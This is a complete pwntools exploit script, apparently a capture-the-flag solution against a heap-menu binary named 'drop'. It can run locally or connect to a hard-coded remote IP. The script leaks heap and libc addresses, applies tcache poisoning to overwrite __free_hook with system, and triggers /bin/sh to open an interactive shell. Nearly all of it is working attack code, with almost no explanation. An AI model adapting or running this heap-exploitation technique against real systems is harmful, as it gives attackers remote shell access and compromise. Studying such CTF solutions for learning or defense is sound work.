from pwn import *
import sys
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
# context.log_level = "debug"

if len(sys.argv) > 1 and sys.argv[1] == "remote":
    io = remote("122.9.157.7", 50001)
else:
    io = process("./release/drop")
libc = ELF("./release/libc.so.6")

def choice(ch):
    io.recvuntil("Your choice: \n")
    io.sendline(str(ch))

def add(content):
    choice(1)
    io.recvuntil("content of the new item: \n")
    io.sendline(content)

def edit(idx, content):
    choice(3)
    io.recvuntil("Index: \n")
    io.sendline(str(idx))
    io.recvuntil("new content: \n")
    io.sendline(content)

def swap(ia, ib):
    choice(4)
    io.recvuntil("Index A: \n") 
    io.sendline(str(ia))
    io.recvuntil("Index B: \n") 
    io.sendline(str(ib))

def show(idx):
    choice(2)
    io.recvuntil("Index: \n")
    io.sendline(str(idx))
    io.recvuntil("item: \n")
    return io.recvline()

def leak_first_addr(idx):
    return u64(show(idx)[:8])
    
def reverse_bubble(idx):
    choice(4)
    io.recvuntil("West/East? (0 is West and 1 is East)\n")
    io.sendline("0")
    io.recvuntil("Launching index: \n")
    io.sendline(str(idx))

def bubble(idx):
    choice(4)
    io.recvuntil("West/East? (0 is West and 1 is East)\n")
    io.sendline("1")
    io.recvuntil("Launching index: \n")
    io.sendline(str(idx))

# heap fengshui, to fill up the tcache and 
for i in range(10):
    add("h"*0x100)
reverse_bubble(8)
for i in range(10):
    success("addr: " + hex(leak_first_addr(i)))

# leak libc
offset = 0x1ecbe0
libc_base = leak_first_addr(2) - offset
libc.address = libc_base
success("libc_base: " + hex(libc_base))

# tcache poisoning
edit(3, p64(libc.sym['__free_hook'])+b"a"*0x90)

print()
for i in range(10):
    success("addr: " + hex(leak_first_addr(i)))

add("/bin/sh\0"+"a"*(0x100-8))
add(p64(libc.sym['system'])+b"a"*(0x100-8))
choice("/bin/sh\0")
    
io.interactive()
